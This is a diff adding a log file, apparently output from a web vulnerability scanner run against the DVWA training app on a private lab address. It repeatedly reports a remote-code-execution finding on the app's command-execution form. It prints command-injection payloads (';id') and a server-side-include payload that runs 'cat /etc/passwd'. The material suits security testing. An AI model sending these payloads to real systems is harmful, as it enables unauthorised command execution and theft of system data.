@@ -1,0 +1,23 @@
+[+] RCE vulnerability detected, link:http://192.168.82.128/dvwa/vulnerabilities/exec/
+[*] Form details:
+{'action': '#', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'ip', 'value': ''}, {'type': 'submit', 'name': 'submit', 'value': 'submit'}]}
+[+] RCE vulnerability detected, link:http://192.168.82.128/dvwa/vulnerabilities/exec/
+[*] Form details:
+{'action': '#', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'ip', 'value': ''}, {'type': 'submit', 'name': 'submit', 'value': 'submit'}]}
+Payload: ;id
+
+[+] RCE vulnerability detected, link:http://192.168.82.128/dvwa/vulnerabilities/exec/
+[*] Form details:
+{'action': '#', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'ip', 'value': ''}, {'type': 'submit', 'name': 'submit', 'value': 'submit'}]}
+Payload: ;id
+
+[+] RCE vulnerability detected, link:http://192.168.82.128/dvwa/vulnerabilities/exec/
+[*] Form details:
+{'action': '#', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'ip', 'value': ''}, {'type': 'submit', 'name': 'submit', 'value': 'submit'}]}
+Payload: &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+
+[+] RCE vulnerability detected, link:http://192.168.82.128/dvwa/vulnerabilities/exec/
+[*] Form details:
+{'action': '#', 'method': 'post', 'inputs': [{'type': 'text', 'name': 'ip', 'value': ''}, {'type': 'submit', 'name': 'submit', 'value': 'submit'}]}
+Payload: ;id
+
